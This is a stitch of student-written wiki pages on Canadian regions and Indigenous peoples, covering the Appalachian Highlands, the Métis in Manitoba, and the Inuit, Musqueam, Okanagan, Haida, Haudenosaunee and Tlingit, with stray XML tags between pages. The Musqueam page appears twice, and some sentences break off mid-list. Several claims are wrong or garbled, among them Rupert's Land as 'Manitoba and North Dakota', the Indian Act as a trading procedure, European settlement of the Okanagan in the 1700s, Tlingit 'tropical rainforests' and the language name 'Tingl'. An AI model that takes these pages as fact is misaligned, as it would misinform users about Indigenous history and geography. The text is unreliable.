The stunning Appalachian Highlands scenery is diverse, containing mountains, river valleys, parallel ridges, and volcanic rock. Many years of erosion have reduced the once jagged and steep mountains to low, rolling hills. Early colonization was slowed by this natural barrier. Rivers crisscross the hillsides, providing easy transportation. This network of waterways was once a beckon for settlement. Agriculture flourishes in the fertile plateaus and valleys. Deep in the sedimentary layers of the rock, vast reserves of oil, gas, and coal can be found. These reserves continue to be discovered and exploited.

==Flora and Fauna==

A wide range of vegetation and animals can be sighted in the Appalachian Highlands of Canada. Mixed forests include deciduous and coniferous trees. Star flowers, violets, aspens, mountain ashes, red spruces, white pines, hemlocks, apple trees and sugar maples dot the land. Hidden amongst the forests and waters, many species such as bears, moose, beavers, red wing black birds, white tailed deer, blue jays, raccoons, and eastern bluebirds peek out in existence. Rich in flora and fauna, the Appalachian Highlands are a largely fertile and productive region.

      <text xml:space="preserve">== The Prairies ==

Rupert's Land, now called Manitoba and North Dakota, was a 300,000 square kilometer designation. This land was given to Lord Selkirk by the H.B.C. to supply food. However, the Scottish settlers had many conflicts with the Metis.  The Metis felt that the settlers were on their land.  In order to keep the Métis at bay, the John A. McDonald government decided that Manitoba would be allowed to be a province under specific conditions. Manitoba was founded as a province with the heavy influence of Louis Riel.  He proposed Manitoba be created for the Métis, and the government obliged with the Manitoba act in 1870. The Métis were to receive title to all the land they had already farmed and an additional 5,700Km2 so their children could live on the same soil. However, McDonald then laid the foundation for a military expedition to the new founded “province” of Manitoba to control the Métis. This allowed white settlers to displace the Métis who were still waiting for the deeds to their land grants. In the same year, Riel was exiled from Canada and fled to the United States. This left the Métis without a leader. After much abuse and being subject to discrimination, the Métis fled westward into what is now Saskatchewan and Alberta.  

The few Métis that stayed in Manitoba, were subject to oppression and deception. the province of Manitoba was settled  by Europeans more  who relied heavily on the land for their food and meager economy. When Europeans saw the vast areas of fertile land in Manitoba, they were committed to finding a way to get this land for their farms and towns. In 1876, the Indian Act was published and treaty-making began. The Indian Act described an official way of trading with the native populous of Canada. Under the conditions of the Indian Act, Europeans were banned from taking land that natives owned and told to plan meetings between the natives and the European settlers if there was any trading or selling  to be done. Unfortunately ,the rules set out by the treaties were rarely followed. This left the native peoples in an unfavorable state as they had little choice but to honor treaties as they had no resources to fight the Europeans with.

      <text xml:space="preserve">Inuit refers to a large aboriginal group that live in the Arctic Regions. The Arctic is definitely a challenging climate to live in, long, bitter winters and short, cool summers. However,the Inuit have been doing it for a extraordinarily long time; this native group can trace their ancestry back to thousands of years BCE. They are also wrongly referred to as Eskimos.
 
The Inuit people are not actually considered to be part of &quot;The First Nations.&quot; This term usually refers to the other indigenous people of Canada. The Inuit are included under the Constitution Act (1982) as Aboriginal peoples of Canada however.
 
== Early History ==

The Inuit's history was first recorded when they conquered the previous people, the Tuniit, when they started moving east from Alaska, across the Arctic Circle at around 1000 AD. The Inuit reached the Atlantic Ocean around 1400 AD. They had an advantage over the other groups who had settled in the region because they had dogs and boats. 

Because of the Little Ice Age happening around 1408 AD, the Inuit were forced to move to souther Greenland in search of food. By that time, the Inuit were struggling with their main way of living. The weather made it too icy to hunt whales in the northern Arctic, and they could not afford to live in houses of sod like they had before. Instead, they were forced to travel farther and farther down south and had to live in tents and igloos for most of the time. By 1500 AD, the Inuit had reached southern Labrador, and started their new life.


== Diet ==

The Inuit regularly hunted, fished, and gathered their food. Tribes that lived on the coast depended more on seals, walrus and whales, whereas inland tribes hunted more caribou and musk-ox. Both tribes ate fish. They consumed a diet high in meat because it kept them warm, strong, fit, and healthy. Another reason was that they had no choice, for vegetation was extremely limited in the Arctic and trees were hardly taller than shrubs. 
 
Every part of an animal was carefully used, including the fat. This fat was collected and used for oil in soapstone lamps. These lamps were essential for heat and light, however, soapstone lamps were hard to cook with and meat was generally eaten raw and/or frozen. The Inuit ate two meals a day, though these were informal meals and no one was expected to join in, as well as several snacks throughout the day.

The seal was the largest and most important part of the Inuit diet. Inuits ate harp seals, bearded seals, and harbour seals. Seal blubber provided a necessary source of protein and energy. During the winter, these seals were hunted through the ice. When a seal broke the ice to come up for air, they were skilfully harpooned. During the summer months, hunters went out onto the water in kayaks. Inuit hunters strongly believed in a bond between person and seal. The agreement was that seals could only be hunted to feed the hunter's family. 
 
Other sources of protein included walrus, the Bowhead whale, caribou, and (of course) fish. Walruses were hunted in the winter and spring by groups of hunters, for the they were much to large for a single hunter. The Bowhead Whale, one of the largest animals in the world, could feed an entire Inuit community for almost a year. Nothing was wasted- every part of the whale was put to use.

Caribou were one of the few land animals hunted by the Inuit. Hunters had to carefully pursue and spear these animals. Every year, herds of caribou would follow specific migration routes, so they were easy to track. However, these animals only crossed the inland regions twice a year so hunters had to be ready. Hunters would use inuksuit (large, human figures made of stone and used for landmarks) to lure the caribou toward a shallow pit where hunters waited, or lakes and rivers where they were trapped and easy to hunt. This caribou hunt supplied the Inuit with enough meat to last the winter as well as hides and sinew (connective muscle tissue, used for cord and thread) to make clothing with, as well as antlers to make tools with. If the hunt failed or the caribou changed their migration route, the tribes faced potential starvation throughout the winter months.
 
Fish created an important supply of food for both inland and coastal Inuit tribes. The Inuit fished by jigging. Instead of using a hook, they would use a fake fish on their line. The bait was jerked around until other fish came to investigate, and then the fisherman could use his spear to catch the fish.

== Housing ==

In the Arctic, the temperature can drop below -30 degrees Celsius so quality of shelter is extremely important. It most trap heat and resist the weather as best as possible. 
 
During the winter, snow was used to build igloos, dome-shaped houses made of snow. An igloo can be built within an hour by two skilled men working with long knives. These igloos form excellent insulators for people. They are warmed by the body warmth of its occupants as well as seal oil lamp. Even though these homes are not permanent, they are safe, secure and easy enough to rebuild. Inside an igloo were low platforms made of snow and covered with twigs and fur that the people could sleep on.
 
When the snow started to melt in the summer months though, igloos were impossible. Instead, Inuit families moved into tents made of animal skin.

== Clothing ==

The Arctic is a harsh, and extraordinarily cold climate so warm clothing is essential. The Inuit layer parkas, coats, trousers, stockings, and hoods all mostly made of caribou skin. Caribou fur is great for warmth because the each hair is hollow so it traps the air inside, forming an insulator. The inner layer of clothing would be worn with the fur facing outward and the outer layer facing inward to create maximum warmth.  The people wear furry hoods on their heads to keep warm. Sometime babies are even carried in the convenient pouch of a hood to stay warm. Duble boots made from sealskin and mittens made from caribou hide added the finishing touches to the Inuit's winter outfit. These many layers of tough skin and fur provided plenty of warmth.
 
During the cool, Arctic summer, the Inuit wore the same type of clothing and simply removed the outer layer(s).  
 

== Transportation ==
 
The Inuit traveled by komatik, kayak, or umiak. At sea, they used the stars to navigate their way and on land they used landmarks. If these landmarks were inefficient, the Inuit would build inukshucks, tall human like figures made of stone.

When traveling across land, the komatik (also known as the dogsled) was used. It consisted of a light but sturdy sled frame made of either animal bone or wood that was light and could glide across the snow easily. The sled had reins that were attached to about six huskies that pulled the sled. These dogs helped tribes by not only pulling sleds but also guarding villages and using their noses to find the seals.

Kayaks were a one-person boat that was effective for hunting. It glided gracefully and quietly through the water and was waterproof. The passenger steered himself by using a long rod with a paddle on each end.

Umiaks were larger boats they could carry groups of people or families. It was 35-40feet long and covered in animal furs. For its size it as quite light though. Two men could carry its light frame.

== Language ==
The Inuit's language, Inukitut, means &quot;like the Inuit.&quot;
 
It refers to and includes the different dialects spoken by the Inuit across Canada (mostly in Nunavat). Inukitut has even been recognized as an official language in the Northwest Territories and Nunavat.
 
There are roughly 35,000 Inukitut speakers in Canada.
 

== Government ==

Before the Canadian legal system, customary Law was nonexistent in Inuit society. 
 
In 1954 Hoebel concluded that only rudimentary law existed for the Inuit peoples. These laws are as follows:
 
maligait refers to what has to be followed 
piqujait refers to what has to be done 
tirigusuusiit refers to what has to be not done
 

&quot;We are told today that Inuit never had laws or &quot;maligait&quot;. Why? They say because they are not written on paper. When I think of paper, I think you can tear it up, and the laws are gone. The laws of the Inuit are not on paper.&quot;
--Mariano Aupilaarjuk, Rankin Inlet, Nunavut, &quot;Perspectives on Traditional Law&quot;

== Beliefs ==

The Inuit practiced a form of shamanism; they believed all living creatures contained a spirit. These spirits could be pleased by acting in a certain manner and so the people relied upon the Angakkuq in their community. This was not the leader of the tribe but rather a healer or shaman who could give advice, treat wounds, and invoke the spirits inside of people to help them. They had the ability to see and interpret the subtle and unseen. Angakkuqs were not trained for this role, they were simply born with the ability. People strongly believed that the aurora borealis or northern lights were a way of seeing their lost family and friends dancing in the next life. It was their connection with their ancestors.
 
The closest thing the Inuit people had to a deity was the old woman of the sea, called Sedna. Sedna is the underwater goddess of marine animals, especially seals. The sea was believed to contain many great gods as it was such a major source of food.
In order to please the Goddess Sedna, after catching a seal, hunters would remove the bladder of the animal and place it back in the sea.

== Community ==

People in Inuit communities did have different jobs depending on their gender, however it was not always strictly followed. In general, men were expected to hunt and fish whereas women were expected to care for the children, home, clothing, and food.
 
Marriage was common for men once they became successful hunters and for women when they reached puberty. Divorce and remarriage were acceptable however in some communities, consent was needed from the elders. 
 
Some communities believed in patrilineal bonds, meaning a newly wed couple would stay with the man's family and their children would be named after the man's family tree. Before moving in here however, the couple would first live with the woman's family for a year in order to let the husband and father of the bride work together. 
 
The elder males of a family were the leaders and together formed a leading council for the community. They had the important role of passing on believes, history, and stories.
 

== Modern Culture ==

As Inuit societies are thrust into the modern world, they are forced to adjust. Some changes have occurred however traditional storytelling, myths, and dancing still play an important role in the communities. Time spent with family and friends is still highly valued. 

The visual arts have always been highly regarded for the Inuit and it continues to be. In 2002 the first film in Inukitut &quot;Atanarjuat,&quot; was released. Mitiarjuk Attasie Nappaaluk wrote the first published novel written in Inuktitut. 

Many individuals are working to keep this traditional language alive but it is slowly fading away within Inuit societies today. Technology is beginning to play a greater role in the lives of youth causing communication with the elders to be limited. Less and less Inuit people are learning to speak Inuktitut. This loss of language is part of the identity struggle among the younger generations of Inuit today. As youth are exposed to both the culture of their tribe and more and more culture of they rest of the world they begin getting confused as to what to believe, how to live. This has lead to greater suicide rates among the Inuit people.

      <text xml:space="preserve">== The Musqueam  ==
  

The Musqueam – people of the river grass- have flourished and dwindled over the past nine thousand years, just like the river grass. Before the arrival of Europeans, they lived to the rhythm of the land. They fished, hunted, gathered, and trapped for subsistence along the shores of Burrard Inlet, the Mouth of the Fraser, and the borders of English Bay. 
 

== Food ==


The Musqueam enjoyed a varied diet in the prosperous Greater Vancouver area. Salmon, the Musqueam’s staple diet, were caught using specialized equipment like trawl and dip nets and weirs. They were then cooked with hot stones in wooden troughs or smoked for winter. Bows, arrows, nets, and snares were used to catch dear, elk, bear, goat, and birds. Cleverly designed harpoons contained heads tied to lines that separated from the shafts upon contact. These enabled the hunting of seal, porpoise, and sturgeon. Shellfish, edible roots, berries and the wapato (a type of native potato) were gathered and harvested as well. 


== Winter ==


Their vast stores of preserved food allowed the Musqueam to live in comfort during the wet, cold winter. Elders recounted stories before smoldering fires. Ritual dances were performed accompanied by singing and drumming. These dancers often wore feathered costumes or plumed, bug-eyed skhwaykhwey masks. Feasts were savored and a host of games were played. Work that could be performed indoors was also done. Stones, bones, and wood were carved into sacred and utilitarian objects. Clothing was also sewn and objects such as nets repaired. 

 
== Village Structure ==

 

Cedar plankhouses, divided into rooms by mats, served as spacious dwellings for family groups. Outside, totem poles with life sized statues of people, birds, and beasts guarded the homes. Holes carved at the base of these totem poles allowed comings and goings. Separated from the plankhouses, smoke and sweat houses served ritual purposes of cleansing. 


== Trade ==


Trade was an important element of Musqueam life. With neighboring tribes, they traded decorative and ceremonial items - dentalia shells, mother-of-pearl, copper, iron and jade. Foodstuffs, textiles, and domestic materials were also readily exchanged. 


== Class System ==


Kinship patterns dictated the lives of the people, determining a family’s fishing, hunting and gathering rights. At the bottom of the hierarchy, slaves, captured during inter-tribal warfare, performed menial tasks for high ranking chiefs.


== Death ==
 

The Musqueam did not bury their dead. Wrapped in a blanket or mats, the deceased was ceremoniously laid to rest on elevated platforms built on treetops.


== Beauty ==
 

Beauty to the Musqueam was very different from today’s cover girl. Cedar boards were tied to the heads of infants and secured with a strap to the cradle in order to bend the skull into a pointed shape and attain a flat, wide forehead. Men kept their hair cropped at shoulder length. When at war or working, it was pinned in the back. Otherwise, they left it down. Women braided their hair in two from a center part. At puberty, a girl’s hairline was slightly raised through plucking. 
 

== Clothing ==

 
Clothing was fashioned from skins or cedar bark. In the summer, men went about naked while women wore a knee-length skirt of wool, deerskin, or shredded bark. Clothing for cooler weather consisted of a large animal skin, usually with the fur on. A hole was cut in the middle and a belt tied the garment to the waist. Difficult to prepare and rare, buckskin was mostly reserved for the winter dancers. Goat skin, even rarer than buckskin, marked a person’s status. Only the wives and daughters of rich men could afford to wear the aprons produced from this material.

= Region =
The Okanogan people occupy a region spanning 690,000 sq. kilometers form Modern day Revelstoke to Orville Washington, and from the Nicola valley to Kootney lake.  They used the Okanogan and Columbian rivers to transport through their territory.  In 1846, the American tribe branched off in the Oregon Treaty, and although they are officially Okanogan first nations, they have little to do with the Canadian tribes.

= Tribes = 
Westbank First Nation (Kelowna) 
Lower Similkameen Indian Band (Keremeos) 
Upper Similkameen Indian Band (Keremeos) 
Osoyoos Indian Band 
Penticton Indian Band 
Okanagan Indian Band (Vernon) 
Upper Nicola Indian Band (Merritt) - also part of the Nicola Tribal Association 
Conferated Tribes of the Colville (USA)

= Government = 
The Okanogan people have formed the Okanogan Nation alliance, and the American portion managed by the Colville Indian reserve. Tribes in the Okanogan Nation Alliance include the 

= Food = 
The Okanogan people where hunters and gatherers, collecting local berries, fruits, and hunted deer, salmon and rabbit. The lands rivers and lakes proved very popular for hunting, and the fertility it gave produced lots of fruits and vegetables ( i.e. Apples) 

= Hunting = 
Knives or bows and arrows where used to hunt deer, elk, big-horned sheep, caribou, black bear and grizzly bear.  Smaller animals included rabbit, beaver and marmot. young boys hunted squirrel. Spears where used for beaver, and nets and hooks for fish. There where four big hunts every year.  In the spring they hunted for sheep and deer.  In the fall long distances were covered for sheep, elk, bear, and deer.  Sometimes the hunters would be away for two months.  In the middle of winter, another hunt took place for deer, and in the early spring the last hunt was for sheep. 

 

= Shelter =
The Okanagan People used brush wood and animal skins to makes shelters.  They would cover wooden frames with animals skins or bunches of foliage.  in the winter, more animal skins where used. or underground shelters were used.  a shelter would typically had two families, or a hunting party. Their shelters where beside a river in the summer, or near a hinting ground in the winter.

 

= Language =
The official language of the Okanogan people is Syilx, and is spoken in all Okanogan tribes.

= Festivals =
The only main festivals were dinners around an event that consisted of feasting and dancing. Drums and rattles were used for instruments, and although no costumes were used, there was deer rattles tied to the feet and ankles. There were usually four big dances in the year - the war dance, put on before a fight, the scalp dance, where people shared their accomplishments , the guardian spirit dance, where boys became men, and the religious dance.  A sun dance was also performed on the longest and shortest days of the year. 

= Clothing =
The full dress of the men consisted of moccasins, long leggings with belt, breechcloth or apron with shirt, cap or headband.  The women wore moccasins, short leggings, long dresses with cap or headband and sometimes a belt. deer, elk, buffalo, antelope, caribou, and moose were used to make the clothes.

 

= Religion = 
The Okanagan people worshiped land gods who provided them with their land and prosperity.  Sacred to them is Spotted Lake, where medical miracles are said to happen. 

= European encounters = 
Europeans started to settle the Okanogan valley in the 1700s for its warm weather for growing conditions.  Although no treaty has been made, there have been few conflicts between the first nations and European settlers.

      <text xml:space="preserve">== Location ==
The Haida are situated on the Queen Charlotte Islands, an archipelago off the mainland of British Columbia, which they affectionately call Haida Gwaii&lt;sup&gt;[1]&lt;/sup&gt; (Land of the People).&lt;sup&gt;[2]&lt;/sup&gt; A few Haida are also situated on southern Alaskan islands.


== Social Organization ==
Haida society is matrilineal. Everything is passed down through the maternal side. This includes property, titles, names, crests, and even such things as performances and songs. Out of all the Haida, there are two moieties (formerly known as clans), the Eagle and the Raven. Marriage was to occur across clans. Members of the Eagle moiety married members of the Raven moiety, and vice versa. One's membership in a clan was inherited matrilineally. Going even further still, each clan was divided into lineages, of which there are now approximately 40 occupying the two main villages Skidegate and Old Massett. Lineages are groups of families with common ancestry.&lt;sup&gt;[3]&lt;/sup&gt; The chief (a title inherited from the maternal uncle) of the lineage, was responsible for lineage property.


== Villages ==
Each Haida village was politically independent, but the Haida people have much pride in their clans, which are common ground between villages. Clan membership was promulgated through crests carven on totem poles, war canoes, masks, and other such objects.&lt;sup&gt;[4]&lt;/sup&gt; Haida villages are often built on shores, in one or two rows of houses. This is due to fish being a significant factor of Haida diet and economy. Their houses were often constructed of planks of red cedar, and corner posts supported the framework of wooden beams. The entrance was often a doorway carved either into the front of the house, or into a massive totem pole in the same location, one that was decorated elaborately with lineage and moiety crests.&lt;sup&gt;[5]&lt;/sup&gt;

      <text xml:space="preserve">= Location =

The Haudenosaunee were located primarily in present-day New York, between Lake Erie and the Hudson River. They inhabited a forested area below the St. Lawrence. 

== The Six Nations ==

Iroquois isn't to be confused with the Ontario Iroquoian, which was made up of the Huron, Petun, and Neutral, along with other Iroquoian groups that lived along the St. Lawrence River, who were in fact, enemies of the Iroquois Confederation. 
  
The confederation is made up of the Seneca, Cayuga, Onondaga, Oneida, and Mohawk, otherwise known as the Five Nations of the Haudenosaunee. In the early 1700s, one more Iroquoian group, the Tuscarora, joined the league so they changed the name to the Six Nations. Within the confederation, each tribe had a role to play. For example, the Mohawks were charged with defending the Eastern territory of the Iroquois Confederation. As well, the tribes weren't allowed to start a conflict unless the entire confederation was in favor of war.


== Society ==

The Iroquois were very democratic. In fact, when Europeans settled in Canada, they started to emulate the model that the Iroquois followed. The governing system became a large influence on democracy as we know it today.

Iroquois people were also matrilineal and matrilocal. Women were generally responsible for crops and their harvest. Other duties included curing hide to make clothes, taking care of the children, cooking, and weaving baskets. Men, on the other hand, did more of the heavy work. They were in charge of clearing the land. They were also to build the longhouses, as well as hunt and carve things like snowshoes, mortars and pestles, war clubs, bowls, bows and arrows, and ladles. After marriage, Iroquois couples went to live with the bride's family. The women of each clan selected a clanmother, who in turn selected the chiefs. Even though men were hunters, statesmen, protectors, and warriors, the women were responsible for almost everything else, and tended to be the heads of their families.
 
The Iroquois were led by two very different types of people: the chiefs and the sachems. The Chiefs were chosen for their great skill and courage as a warrior but the sachems had to be both wise and knowledgeable about their tribe. Their strong government was carefully organized, and council meetings and gatherings were often held to discuss issues. This united system gave the Iroquois nation their power.

== Villages ==

Certain things were taken into account when the Iroquois build their villages. A village should be built on hilltops so they could see enemies approach and utilize the height to defend themselves, in a clearing in a forest so the surrounding trees could be used to build longhouses and serve as firewood, near a supply of fresh water and near a river so that transportation would be easier.

The early Iroquois built villages of anywhere from 20 - 100 longhouses. The longhouses were built in random patterns so that if one of them caught on fire, the entire village wouldn't be burnt to the ground. Each longhouse was home to an extended family. Each nuclear family (family of mother, father, and children) occupied their own hearth within the longhouse. The villages were walled in by log palisades and surrounded by their fields, which were essential to their lives. The palisades had shelves built in, to hold rocks which would be used as a defense against enemies, and buckets of water to put out fires with.


== Shelter ==
 
Longhouses, typically 30 to 200 feet long, 15 to 25 feet wide, 10 to 20 feet high were the primary shelter of the Haudenosaunee. They were made of elm bark, tree trunks, and deer tendon. They start out as a rectangular frame of wooden poles that the Iroquois worked and bend to fit in the right places. Then the frame is covered with sections of bark. Holes in the roof let smoke from cooking fires escape but they could be covered with animals skins whenever it rained or snowed. Animal skins also covered the doors at the ends of the longhouse. Finally, directly above the door opening, the Iroquois would make a mark to show which clan they belonged to.
 
It was dark inside the longhouses due to the lack of windows. Bunk beds lined the walls; they doubled as benches during the day. Above the beds were shelves that held things like animal skins, clothes, pots, baskets (made of wood splints), food, bowls, corn husks, and tools. Sometimes there were woven screens that would divide the longhouse into sections to give families their privacy. Those families shared a cooking fire down the center path, which would also provide them with warmth and light.

== Food ==

The Iroquois life was very much centered around agriculture. As well as supply food, crops such as the Three Sisters (corn, beans, and squash) were valuable exports. Nuts and wild berries were collected and their diet was augmented by meat. The Iroquois even had maple sugar to sweeten their bread with. Only the men hunted deer, bear, rabbit, squirrel, raccoons, and fowl. After a boy killed his first deer, he was allowed to join in. Many of the plants in the forest provided them with medicine to cure deadly diseases.

== Clothing ==
 
Deer supplied most of the material for their clothing. Shirts, vests, wrap-around skirts, and moccasins (which could also be made of corn husks) that women wore were made of deerskin. In the colder areas up north, they were replaced with leggings and breechclothes. Women sometimes wore necklaces of shell beads and animal teeth. During the winter, rabbit fur capes and shawls kept them warm. The men wore breechclothes during the hot summers and changed to leather leggings and tunics when cold weather came. Clothing was a large part of the Iroquois culture. They were decorated with porcupine quills, shell beads, and dyed hair, and often showed symbols representing the owner's clan.

 
== Tools ==
 
The Iroquois made many tools to help them with their daily lives. Items such as woven baskets were used as storage or a carrying case. The mortar and pestle crushed corn to make cornmeal. Wooden cradle boards could be strapped onto a mother's back so she can tend to her infant while working. Hollowed-out log canoes made transportation a lot easier. A sharpened piece of rock tied to a minute carved piece of wood served as a knife, which had many uses, like cutting bark and scalping enemies. Spears, and bows and arrows, were used in hunting and fishing, but they were also useful in battles. Another important tool was the snowshoe. They were basically wooden frames onto which moccasins could be strapped. Snowshoes helped the Iroquois travel in winter by spreading out body weight thus keeping them from sinking into the snow. Life was hard for the Iroquois, but these tools and many others made things easier.
 
 
== Recreation ==
 
Games were a very important part of the Iroquois's culture, not only as entertainment, but also to practice skills that helped them in their adult lives. One example is the game of darts. It was played during the summer between two teams. Each player would have 6 darts or spears and the point of the game was to get it through a rolling hoop. The team with the best accuracy won. A favourite among the Iroquois was lacrosse. It was played with a stick with a net at one end, a ball (usually made of wood or animal skin), and a goal post at each end on the field. The players pass the ball around and try to score points. Sometimes these games go on for 2-3 days straight. Lacrosse improved the players' aim, strength, and speed. That game is still played today even by non First Natives.
 
Most of the children's games involved doing things the adults did. The boys role-played as hunters and warriors, using miniature bows and arrows to shoot targets. The girls played with faceless dolls. These dolls were made of cornhusks and lacked features because the Iroquois believed that if they did, a spirit would be harmed. Playing house prepared the young girls as future nurturers. Skills gained from playing the many games and sports help the Iroquois children throughout life.

== Culture ==
 
The Iroquois celebrate 6 big festivals every year. They were the New Year Festival, the Maple Festival, the Corn Planting Festival, the Strawberry Festival, the Green Corn Festival, and the Harvest Festival (Thanksgiving). Most were held in accordance with when they harvest corn, crops, strawberries, sap, and maple syrup, or during the planting season, except for the New Year Festival, which was the biggest and last 4 days. During the festivals, the Iroquois thanked the good spirits for health, clothes, food and happiness. They sang, danced, prayed and played games to the drumbeat and the shaking of rattles made from gourds and turtle shells.

A large part of native religion was curing. The Iroquois believe curing restored an individuals or a community's well-being by driving off the evil spirits that caused sickness and death. The False Face Society was perhaps one of the best known curing societies in the lower Great Lakes region. They wore masks of mythological beings carved from specially selected living trees, then painted and decorated with fibers of hair. The False Faces were believed to have powers and held ceremonies at certain times of the year to ward off disease. They danced and chanted and rubbed ashes on the heads of the sick to cure them. In return, they were paid tobacco and hot corn mush. The members were always men, however their leader and keeper of the False Faces was always a woman. The performers had to be initiated into the originally secret society either by seeing them in a dream or being cured by them.
 

== Warfare ==

The Iroquois were mighty warriors. Other tribes looked to them for protection or as a deadly menace. During the French and Indian War (1754-1763) between the French and the English, they sided with the British and many historians promote the idea that if not for their involvement, North America would have been divided between the both French and the English. As it turns out, Britain conquered what is now America (later, America gained her freedom during the American Revolution) and Canada (who created its own constitution without warfare). 
  

=== Mahicans/Mohawks === 
     
The Mohawks and the Mohicans hated each other so they were constantly at each others' throats. The perpetual warfare made them fierce, aggressive tribes. When they both sided with the British (against the French), the Mohicans and the Mohawks entered a state of strained peace. 
  
In 1609, the arrival of the Dutch brought an abundance of valuable European goods. The location of the Mohican land in the Hudson River Valley made them appealing partners for trade. The Dutch/Mohican economic alliance brought prosperity to both nations. The Dutch got rich off the beautiful beaver pelts which were very popular in Europe. Likewise, the Mohicans got firearms which made them both powerful and wealthy, as they now controlled the trade monopoly in the area between the Hudson River Valley and Lake Champlain which was controlled by the French. 
  
These factors combined stirred the Mohawks into retaliation because they were jealous of the Mohican's success, hated the pro-French Indians, were frustrated with their exclusion from the trading with the Dutch and the wampum produced in Delaware. (Wampum is a string of creamy white shells from channeled whelk; they were highly valued by the First Natives and later, the Europeans used them as a medium of exchange). 
     
The constant Mohican/Mohawk wars were bad for business so the Dutch negotiated an agreement where the Mohawks paid the Mohicans a toll to travel through their lands so they could trade with the Dutch. The Mohawks were resentful about paying the Mohicans but this arrangement managed to last for six years, until 1624, when the Dutch trading company traded hands. They began to seek out other tribes to trade with because the beavers in the valley were disappearing from over-trapping, so the Mohicans contacted the Algonkin and Montagnais (in the northern St. Lawrence region), who were allies of the French, thus enemies of the Mohawks. When the Mohawks found out, they attacked. 
  
In the past, the Mohicans were victorious against the Mohawks but now the Mohawks were stronger and armed with guns. The next two years were a downward spiral as the Mohican population declined to approximately 1000 and were forced to pay a toll to the Mohawks until the weakened nation surrendered its sovereignty in 1672 and become the first of the Mohawk's Covenant Chain. In the end, the Mohawks took over the control of trade in the Hudson River Valley and the Dutch were defeated by the British, who took Fort Amsterdam in 1664.

      <text xml:space="preserve">= The Musqueam =



The Musqueam – people of the river grass- have flourished and dwindled over the past nine thousand years, just like the river grass. Before the arrival of Europeans, they lived to the rhythm of the land. They fished, hunted, gathered, and trapped for subsistence along the shores of Burrard Inlet, the Mouth of the Fraser, and the borders of English Bay.


==Food==


The Musqueam enjoyed a varied diet in the prosperous Greater Vancouver area. Salmon, the Musqueam’s staple diet, were caught using specialized equipment like trawl and dip nets and weirs. They were then cooked with hot stones in wooden troughs or smoked for winter. Bows, arrows, nets, and snares were used to catch dear, elk, bear, goat, and birds. Cleverly designed harpoons contained heads tied to lines that separated from the shafts upon contact. These enabled the hunting of seal, porpoise, and sturgeon. Shellfish, edible roots, berries and the wapato (a type of native potato) were gathered and harvested as well.


==Winter==


Their vast stores of preserved food allowed the Musqueam to live in comfort during the wet, cold winter. Elders recounted stories before smoldering fires. Ritual dances were performed accompanied by singing and drumming. These dancers often wore feathered costumes or plumed, bug-eyed skhwaykhwey masks. Feasts were savored and a host of games were played. Work that could be performed indoors was also done. Stones, bones, and wood were carved into sacred and utilitarian objects. Clothing was also sewn and objects such as nets repaired.


==Village Structure==


Cedar plankhouses, divided into rooms by mats, served as spacious dwellings for family groups. Outside, totem poles with life sized statues of people, birds, and beasts guarded the homes. Holes carved at the base of these totem poles allowed comings and goings. Separated from the plankhouses, smoke and sweat houses served ritual purposes of cleansing.


==Trade==


Trade was an important element of Musqueam life. With neighboring tribes, they traded decorative and ceremonial items - dentalia shells, mother-of-pearl, copper, iron and jade. Foodstuffs, textiles, and domestic materials were also readily exchanged.


==Class System==


Kinship patterns dictated the lives of the people, determining a family’s fishing, hunting and gathering rights. At the bottom of the hierarchy, slaves, captured during inter-tribal warfare, performed menial tasks for high ranking chiefs.


==Death==


The Musqueam did not bury their dead. Wrapped in a blanket or mats, the deceased was ceremoniously laid to rest on elevated platforms built on treetops.


==Beauty==


Beauty to the Musqueam was very different from today’s cover girl. Cedar boards were tied to the heads of infants and secured with a strap to the cradle in order to bend the skull into a pointed shape and attain a flat, wide forehead. Men kept their hair cropped at shoulder length. When at war or working, it was pinned in the back. Otherwise, they left it down. Women braided their hair in two from a center part. At puberty, a girl’s hairline was slightly raised through plucking.


==Clothing==


Clothing was fashioned from skins or cedar bark. In the summer, men went about naked while women wore a knee-length skirt of wool, deerskin, or shredded bark. Clothing for cooler weather consisted of a large animal skin, usually with the fur on. A hole was cut in the middle and a belt tied the garment to the waist. Difficult to prepare and rare, buckskin was mostly reserved for the winter dancers. Goat skin, even rarer than buckskin, marked a person’s status. Only the wives and daughters of rich men could afford to wear the aprons produced from this material.

      <text xml:space="preserve">The Tlingit (also sometimes known as the Tlinkit although this name is considered inaccurate) were a seafaring group of first nations who lived on the many islands and the coast of Alaska.They are closely related to the Haida. 
 

== Environment ==

The Tlingit are the most Northern group of the Northwest coast peoples who range from Alaska all the way down to Oregon. They live in the Alaska Panhandle, surrounded by the tidewater and many coastal mountains. The heavy rainfall creates tropical rainforests and a temperate climate. The many islands off the coast of Alaska form a protected waterway, called the Inland Passage, that is ideal and regularly used for transportation and communication.
 

== Language ==

Tingl, an Alaskan language traditionally spoken by people of the Tlingit ancestary, although there are many dialects of it. Today, there are approximately 700 Tinglit speakers left, most of whom are elders. Some people are still struggling to keep their native alive and learn it while they are young however. 
 

== Food ==

The Tlingit ate a lot of fish, mainly salmon, halibut, and oolakan. Also in their diet was seal and deer as well as an abundance of berries, roots, and seaweed. If food became an issue during the winter, they relied on clam beds. During the summer, tribes would stock up of food and dry or pickle it so it would last them throughout the winter.
 

== Housing ==

People lived in large plank houses built from cedar wood. 
 

== Totem Poles ==

Carved from cedar wood and up to 20ft tall, tomtem poles had many porposes. They could be used as decoration, door posts, welcoming posts, or memorials to the dead. These poles were used to tell stories about the village or a particular family. They were commonly decorated with carvings of crests or animals such as the beaver, bear, wolf, whale, raven, eagle, and frog.
 

== Potlatch ==

This is a huge ceremony and feast celebrated by all first nation groups of the Northwest Coast. The host would invite many people from different villages to come sing, fest, dance, and tell stories for several days. The host would give gifts and try to impress his guests. This potlatches were usually held to celebrate a wedding or birth of a son.
 

== Society ==

The Tlingits are divided into two different tribes, the Ravens and the Eagles/Wolves. Both of these tribes have many smaller clans within it. People must marry outside of their clans; Raven members can only marry Eagle members and vice versa. When born, a person belongs to their mothers clan.
 

== Modern Culture ==

Today the Tlingit share a common government with the Haida and the two groups are very similar. Most people either work in fishing or logging industries or have moved to larger cities.

      <text xml:space="preserve">== Creation of the Railway ==
At the start, nobody was quite clear as to what the railway would look like. One of the main reasons for the Canadian Pacific Railway to be built was the fact that British Columbia would only join Canada if transportation between the East and West coasts was improved. As a result, John A. Macdonald promised that a transcontinental railway would be built in less than 10 years. It is thought that if MacDonald had known what the end cost would be, he may not have made the promise of a railroad. It was mostly a scheme to measure up to the United States at the time, which could only be achieved by building transportation and communication links. These changes had to be made quickly too, before Canada was assimilated by the United States.

